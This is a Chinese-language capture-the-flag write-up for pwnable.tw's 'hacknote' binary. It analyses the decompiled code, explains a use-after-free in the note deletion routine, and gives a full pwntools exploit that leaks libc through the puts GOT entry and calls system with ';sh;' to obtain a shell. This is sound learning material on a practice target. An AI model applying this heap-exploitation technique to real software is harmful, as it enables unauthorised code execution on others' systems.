# pwnable.tw hacknote

### 0x0 前置补偿

[Bash中命令连接符的用法——一次执行多个命令](https://blog.csdn.net/finewings/article/details/6077165?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1)

### 0x1 分析

看一下安全性：

```shell
[*] './hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

地址固定。

这是一个常规的菜单题：

```c
int menu()
{
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  return printf("Your choice :");
}
```

`add()`

```c
unsigned int add()
{
  _DWORD *note; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( cnt <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = print;              // 4 bytes
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        note = ptr[i];
        note[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);  // No EOF
        puts("Success !");
        ++cnt;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

这里每次添加在`.bss`里存一个`0x10`的内存块，用户空间内有`print()`和`content`的地址。

`content`的大小我们自己控制。

`show()`

```c
unsigned int show()
{
  int idx; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  idx = atoi(&buf);
  if ( idx < 0 || idx >= cnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[idx] )
    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);
  return __readgsdword(0x14u) ^ v3;
}
```

这里会调用之前`print()`这个地址的函数，参数也是这个地址的内容。

`delete()`

```c
unsigned int delete()
{
  int idx; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  idx = atoi(&buf);
  if ( idx < 0 || idx >= cnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[idx] )
  {
    free(*((void **)ptr[idx] + 1));
    free(ptr[idx]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

这里`.bss`段上的指针不会被清楚。可以UAF。

#### 漏洞利用

1. `Add`两个note，`content`的大小设置为`0x80`，保证在`free`的时候`content`可以被扔到Unsorted bin内，而不是Fastbin。

2. 添加一个banary。（不添加也没关系。

3. `delete`掉刚才的两个note，两个note的`0x10`的内存块被扔进了Fastbin。

4. `Add`一个note，`content`的大小设置为`0x8`，这样就把刚才的两个`0x10`的内存块申请过来。这样idx0就指向idx3的`content`，idx1就指向idx3的`0x10`的内存块。

   在`Add`idx3的时候，构造`payload `，覆盖idx0的`content`指针指向`puts`的GOT，泄漏libc。

5. 重新申请这两个`0x10`的内存块，构造`payload`为`system`和`b';sh;'`。

   这里要注意点:这里`system`的参数会是自己，这样就不会成功调用，需要一次执行多个命令。

   ```c
   if ( ptr[idx] )
       (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);
   ```

6. `show(0)`来拿到shell。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

# p = process('./hacknote')
p = remote('chall.pwnable.tw', 10102)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./hacknote')
libc = ELF('libc_32.so.6')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

def add(size, content):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Note size :', str(size))
    p.sendafter('Content :', content)

def delete(idx):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Index :', str(idx))

def show(idx):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index :', str(idx))

# leak libc
add(0x80, 'aaa\n')    # idx : 0
add(0x80, 'bbb\n')    # idx : 1
add(0x80, 'ccc\n')    # idx : 2 banary
delete(0)
delete(1)
payload = flat([
    0x0804862B,     # print 
    elf.got['puts']
])
add(0x8, payload)   # idx : 3
show(0)
puts_addr = u32(p.recv(4))
libc.address = puts_addr - libc.symbols['puts']
print ('libc: ', hex(libc.address))
print ('system :', hex(libc.sym['system']))
pause()

# get shell
delete(3)
payload = flat([
    libc.sym['system'],
    # next(libc.search('/bin/sh\x00'))
    b';sh;'
])
add(0x8, payload)   # idx : 4
show(0)
p.interactive()
```

